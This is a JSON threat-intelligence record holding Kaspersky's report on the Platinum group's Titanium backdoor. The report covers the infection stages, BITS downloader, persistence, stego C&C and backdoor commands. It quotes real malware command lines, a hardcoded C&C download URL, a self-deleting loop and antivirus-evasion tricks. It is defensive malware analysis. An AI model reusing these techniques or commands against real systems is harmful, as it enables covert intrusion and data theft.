{
    "id": "4c823732-f7bc-4e45-b0ae-7c6935c5c762",
    "created_at": "2022-10-25T16:48:16.304541Z",
    "updated_at": "2025-03-27T02:12:36.917046Z",
    "deleted_at": null,
    "sha1_hash": "80b06f28ee5e364f47ca3a290b160b2de61bcc0f",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-11-11T04:58:00Z",
    "file_modification_date": "2019-11-11T04:58:00Z",
    "file_size": 425125,
    "plain_text": "# Titanium: the Platinum group strikes again\n\n**[securelist.com/titanium-the-platinum-group-strikes-again/94961](https://securelist.com/titanium-the-platinum-group-strikes-again/94961/)**\n\nBy AMR, GReAT on November 8, 2019. 10:00 am\n\nPlatinum is one of the most technologically advanced APT actors with a traditional focus on the\nAPAC region. During recent analysis we discovered Platinum using a new backdoor that we call\nTitanium (named after a password to one of the self-executable archives). Titanium is the final\nresult of a sequence of dropping, downloading and installing stages. The malware hides at every\nstep by mimicking common software (protection related, sound drivers software, DVD video\ncreation tools).\n\n## Victimology\n\nDuring our research we found that the main targets of this campaign were located in South and\nSoutheast Asia.\n\n## Introduction\n\nThe Titanium APT includes a complex sequence of dropping, downloading and installing stages,\nwith deployment of a Trojan-backdoor as the final step. Almost every level of the system mimics\nknown software, such as security software, software for making DVD videos, sound drivers’\n\n\n-----\n\nsoftware etc.\n\nIn every case the default distribution is:\n\n1. an exploit capable of executing code as a SYSTEM user\n2. a shellcode to download the next downloader\n3. a downloader to download an SFX archive that contains a Windows task installation script\n4. a password-protected SFX archive with a Trojan-backdoor installer\n5. an installer script (ps1)\n6. a COM object DLL (a loader)\n7. the Trojan-backdoor itself\n\n## Infection vector\n\nWe believe the Titanium APT uses local intranet websites with a malicious code to start\nspreading.\n\n### 1 – Shellcode\n\nAnother known way of spreading is the use of a shellcode that needs to be injected into a\nprocess. In this case it was winlogon.exe. Unfortunately, we don’t know how the shellcode was\ninjected. See the shellcode description below.\n\n### 2 – Wrapper DLLs\n\nAttackers make active use of various kinds of ‘wrappers’. Each wrapper is usually a COM DLL,\nwith the corresponding exported functions. The main purpose of these libraries is to decrypt and\nload an encrypted file (previously dropped somewhere) into the system memory (a payload) and\nthen redirect calls to the wrapper itself to the payload’s exported functions.\n\nAnother type of wrapper DLL is designed to obtain a command line from its exported function\nargument passed by a caller and create a new process.\n\n### 3 – Windows task installer (SFX archive)\n\nThis is a password-encrypted SFX archive that can be downloaded via BITS Downloader. The\npassword is hardcoded into the downloader that is used to decrypt the SFX archive using the -p\ncommand line argument.\n\nThe main feature of this archive is that it contains the cURL executable code, compiled into a\nDLL. Its purpose is to install the Windows task to establish persistence in the infected system.\n\n### 4 – Trojan-Backdoor installer (SFX archive)\n\nThe backdoor itself uses an SFX archive which must be launched from the command line using a\npassword to unpack it. All paths examples here and there will be for the DVD making software.\nHowever, these notes can be also applied to any other known software paths.\n\n\n-----\n\n### 5 – BITS Downloader\n\nThis component is used to download encrypted files from the C&C server then decrypt and\nlaunch them.\n\n## Shellcode description\n\nThe shellcode itself contains position-independent code and doesn’t require previously loaded\nlibraries (except Kernel32.dll). Its sole purpose is to connect to the hardcoded C&C address,\ndownload an encrypted payload (the password-protected SFX archive), then decrypt and launch it\nusing the hardcoded unpacking password. The usual command line is:\n\n##### 1 \"rundll32 \"$temp\\IOZwXLeM023.tmp\",GetVersionInfo -t 06xwsrdrub2i84n6map3li3vz3h9bh4vfgcw\"\n\n## BITS Downloader description\n\nThe BITS Downloader is a DLL file which has only one exported function: GetVersionInfoA. The\nmain purpose of this library is to download files in encrypted form from the C&C and launch them.\n\n### Execution sequence\n\nThe first thing the downloader does is to check whether it was started using the SYSTEM user. If\nit was, it launches command line arguments (that were passed to the binary loaded by the\ndownloader DLL) using WMI.\n\nIf it wasn’t started using the SYSTEM user, the downloader passes command line arguments into\nthe argument parser.\n\n#### Argument parser\n\n##### Key Parameter description\n\n -c URL Specifies a URL address where system information will be sent\n\n\n##### -t STRING\n\n\n##### An additional string that will be appended to a request string to the C&C\n\n\n##### -u URL Confirmation URL where the downloader will send various confirmations or request data. Possible to build in two additional confirmation URLs\n\n\n##### -br GUID\n\n\n##### Stop a payload downloading. The GUID parameter must provide a down‐ load task GUID\n\n\nIf one of these parameters exists, the downloader will collect information about installed antivirus\nproducts and send it to the C&C.\n\n\n-----\n\nAfter that, it sends the download request to the confirmation URL. In response, the C&C sends a\nfile that will be downloaded in the %USERPROFILE% directory.\n\nTo decrypt the downloaded file, the downloader uses an MD5 hash of the strings’ encryption key.\n\n#### Confirmation URL request and file downloading\n\nDefault (hardcoded) URL: http://70.39.115.196/payment/confirm.gif\n\nThe request is a string such as:\n\n_http://70.39.115.196/payment/confirm.gif?f=1 (x86)_\n_http://70.39.115.196/payment/confirm.gif?f=2 (x64)_\n\n#### Payload decryption and launch\n\nThis is the structure of the encrypted file:\n\n\n##### 1 2 3 4 5 6 7 8 9\n\n\n##### typedef struct {   byte hash[16]; // md5 hash of the following data   dword data_size;   byte data[data_size]; } enc_data;\n\n\nThe downloader checks the hash field against a calculated MD5 of the data field hash, and if the\nhash is correct, performs the following actions:\n\nAppends an extension (DLL or EXE, depending on data type)\nStores the downloaded file in the %TMP% folder using the name %\n_(SystemTimeAsFileTime.dwLowDateTime).%TMP_\n\nThen the downloader specifies a command line to launch the downloaded file. If the file is a DLL,\nthe final command line will be:\n\n##### 1 \"%systemroot%\\system32\\rundll32.exe %(SystemTimeAsFileTime.dwLowDate‐ Time)%.TMP,-peuwewh383eg -t 06xwsrdrub2i84n6map3li3vz3h9bh4vfgcw\"\n\nIf the file is an EXE file:\n\n##### 1 %(SystemTimeAsFileTime.dwLowDateTime)%.TMP -peuwewh383eg -t 06xwsrdrub2i84n6map3li3vz3h9bh4vfgcw\n\nAfter that, the downloader deletes itself using the following command line:\n\n\n-----\n\n##### 1 /c for /L %i in (1,1,100) do ( for /L %k in (1,1,100) do (del /f /q module_path > NUL & if not exist module_path exit /b 0))\n\n#### File launching\n\nTo launch the downloaded file, the downloader uses the WMI classes Win32_ProcessStartup,\nWin32_Process and their methods and fields.\n\n#### File downloading using BITS\n\nTo download a file, the downloader uses the BITS service and its COM interface, called\nIBackgroundCopyManager.\n\nIt creates a task with the name Microsoft Download, then specifies remote and local file paths and\ntimeouts.\n\n## Windows task installation (SFX archive with cURL)\n\nIt contains:\n\n##### Name Description\n\n p.bat Launches cURL and obfuscated ps1 scripts\n\n c.dll cURL executable compiled as a DLL (7.50.3)\n\n f1.ps1 Will be executed after the first request to the C&C; decrypts x.dat\n\n f2.ps1 Will be executed after the second request to the C&C; decrypts b.dat\n\n e.ps1 Contains code that calculates a string for the Authorization field of the HTTP header\n\n h.ps1 Gets information about the system proxy settings\n\n e.dll A DLL file with a single exported function; calls CreateProcessA\n\nIt downloads:\n\n\n##### Source file\n\n\n##### Downloaded and de‐ crypted file\n\n\n##### Description\n\n\n##### x.dat u.xml AES-encrypted file (see f1.ps1 for decryption algorithm)\n\n b.dat i.bat AES-encrypted file (the same decryption algorithm)\n\nThe result:\n\n\n-----\n\n##### Name Description\n\n i.bat Performs Windows task installation\n\nWhen a caller (previous step) executes this archive, it must specify two arguments:\n\n##### Argument Description\n\n -pKEY Argument with a key to unpack the SFX archive\n\n\n##### -t ACCEP‐ TANCE_ID_STRING\n\n### p.bat\n\n\n##### Argument with a long string – AcceptanceID (used in re‐ quests to the C&C)\n\n\nIt launches the h.ps1 script to get information about system-wide proxy settings. After that it\nlaunches the e.ps1 script to calculate the SystemID that will be used in requests to the C&C.\n\nTo send a request, it uses c.dll (which is cURL and has an exported function called\nDllGetClassObject).\n\n#### Request 1\n\nCommand line arguments:\n\nWhere:\n\n##### Parameter Description\n\n %pp% System-wide proxy\n\n %output% SystemID\n\n %p3% AcceptanceID\n\nThis request downloads the x.dat file, and the f1.ps1 script decrypts it into u.xml. After that it\nlaunches the next request.\n\n#### Request 2\n\nCommand line arguments:\n\n\n-----\n\nIt downloads the b.dat file, and the f2.ps1 script decrypts it into i.bat (using the same decryption\nalgorithm).\n\n#### Task installation\n\nAfter that, it launches the following command line to install the persistence task:\n\nThe i.bat file uses the previously decrypted u.xml file as the task description.\n\n## Trojan-backdoor installer\n\nThe archive unpacks its files into the following folder (in the case of DVD making software):\n\nThe archive itself contains:\n\n##### Name Description\n\n BabyBoyStyleBackground.wmv Configuration data\n\n DvDupdate.dll Trojan-backdoor loader\n\n nav_downarrow.png Trojan-backdoor\n\n psinstrc.ps1 Loader installation script\n\nIn the case of the audio drivers software mimic, it differs only in its installation method compared\nto DVD making software: the ps1 script uses two known CLSIDs to replace their COM DLL paths\nwith malicious ones.\n\n### psinstrc.ps1\n\nThis is the installer script that registers DvDupdate.dll as the ‘DVDMaker Help’ service, and sets\nits entry point as the DllGetClassObject name. It requires admin privileges to be executed\ncorrectly.\n\nThe script contains configurable parameters, so it’s easy to change any of the required\nparameters for different systems.\n\nThere are two ways the loader can be installed:\n\n\n-----\n\nSystem service, with the DllGetClassObject exported function as the ServiceMain function\nCOM object, by replacing an existing CLSID registry path with its own\n\n### DvDupdate.dll\n\nThis is a service DLL, but with all the same exports you would expect from a COM object.\nBasically, it’s a payload loader.\n\nThe whole code is obfuscated with different Windows API calls and loops. It wasn’t designed to\nconfuse a reverse engineer or to make reverse engineering harder, but to bypass some simple\nAV emulation engines.\n\nThe first exported function for every COM object is DllGetClassObject.\n\n#### DllGetClassObject\n\nThe loader creates a thread that decrypts the payload, restores its PE and MZ headers, and then\nloads it into memory and launches it. The payload is encrypted with AES 256 CBC. The\ndecryption key is hardcoded along with other encrypted strings. It doesn’t contain ‘MZ‘ and ‘PE‘\ntags that allow it to bypass simple AV engines. After initializing the payload, the loader calls its\nfunction with ordinal 1.\n\n### nav_downarrow.png\n\nThe payload, with backdoor functionality, is a DLL file. The malware functionality is in the first\nexported entry only.\n\n### nav_downarrow.png – Ordinal 1 (Trojan-backdoor main function)\n\nThe first thing that it does is decrypt the other encrypted binary (containing configuration data)\nfrom the SFX content:\n\nThe configuration itself is divided into blocks, and every block has its own index. The payload\nuses these indices to get a specific item. The configuration contains:\n\nthe C&C address\ntraffic encryption key\nthe UserAgent string\nother less important parameters\n\n#### Execution thread\n\nThe execution thread is responsible for receiving commands from the C&C server and sending\nresponses. It contains an execution loop that starts by reading configuration item #00 to get the\nC&C address.\n\n\n-----\n\n#### Initializing C&C communication\n\nTo initialize the connection to the C&C, the payload sends a base64-encoded request that\ncontains a unique SystemID, computer name, and hard disk serial number. After that, the\nmalware starts receiving commands.\n\n#### Receiving commands\n\nTo receive commands from the C&C, the payload sends an empty request to the C&C. It uses the\nUserAgent string from the configuration and a special cookie generation algorithm to prepare a\nrequest. The malware can also get proxy settings from Internet Explorer.\n\nIn response to this request, the C&C answers with a PNG file that contains steganographically\nhidden data. This data is encrypted with the same key as the C&C requests. The decrypted data\ncontains backdoor commands and arguments for them.\n\nExamples of PNG files:\n\n### C&C command processor (command descriptions)\n\nThe backdoor can accept many different commands, with the following among the most\ninteresting:\n\nRead any file from a file system and send it to the C&C\nDrop or delete a file in the file system\nDrop a file and run it\nRun a command line and send execution results to the C&C\nUpdate configuration parameters (except the AES encryption key)\nInteractive mode – allows to the attacker to receive input from console programs and send\ntheir output at the C&C\n\n### Conclusions\n\nThe Titanium APT has a very complicated infiltration scheme. It involves numerous steps and\nrequires good coordination between all of them. In addition, none of the files in the file system can\nbe detected as malicious due to the use of encryption and fileless technologies. One other feature\nthat makes detection harder is the mimicking of well-known software.\n\n\n-----\n\nRegarding campaign activity, we have not detected any current activity related to the Titanium\nAPT.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.11.08_Titanium_Action_Platinum_group/Titanium_%20the%20Platinum%20group%20strikes%20again.pdf"
    ],
    "report_names": [
        "Titanium_ the Platinum group strikes again"
    ],
    "threat_actors": [
        {
            "id": "33f527a5-a5da-496a-a48c-7807cc858c3e",
            "created_at": "2022-10-25T15:50:23.803657Z",
            "updated_at": "2025-03-27T02:00:55.550132Z",
            "deleted_at": null,
            "main_name": "PLATINUM",
            "aliases": [
                "PLATINUM"
            ],
            "source_name": "MITRE:PLATINUM",
            "tools": [
                "JPIN",
                "Dipsind",
                "adbupd"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7d8ef10e-1d7b-49a0-ab6e-f1dae465a1a4",
            "created_at": "2023-01-06T13:46:38.595679Z",
            "updated_at": "2025-03-27T02:00:02.869216Z",
            "deleted_at": null,
            "main_name": "PLATINUM",
            "aliases": [
                "TwoForOne",
                "G0068",
                "ATK33"
            ],
            "source_name": "MISPGALAXY:PLATINUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e61c46f7-88a1-421a-9fed-0cfe2eeb820a",
            "created_at": "2022-10-25T16:07:24.061767Z",
            "updated_at": "2025-03-27T02:02:10.094583Z",
            "deleted_at": null,
            "main_name": "Platinum",
            "aliases": [
                "ATK 33",
                "Operation EasternRoppels",
                "TwoForOne"
            ],
            "source_name": "ETDA:Platinum",
            "tools": [
                "AMTsol",
                "Adupib",
                "Adupihan",
                "Dipsind",
                "DvDupdate.dll",
                "JPIN",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "RedPepper",
                "RedSalt",
                "Titanium",
                "adbupd",
                "psinstrc.ps1"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041556,
    "ts_creation_date": 1573448280,
    "ts_modification_date": 1573448280,
    "files": {
        "pdf": "https://archive.orkl.eu/80b06f28ee5e364f47ca3a290b160b2de61bcc0f.pdf",
        "text": "https://archive.orkl.eu/80b06f28ee5e364f47ca3a290b160b2de61bcc0f.txt",
        "img": "https://archive.orkl.eu/80b06f28ee5e364f47ca3a290b160b2de61bcc0f.jpg"
    }
}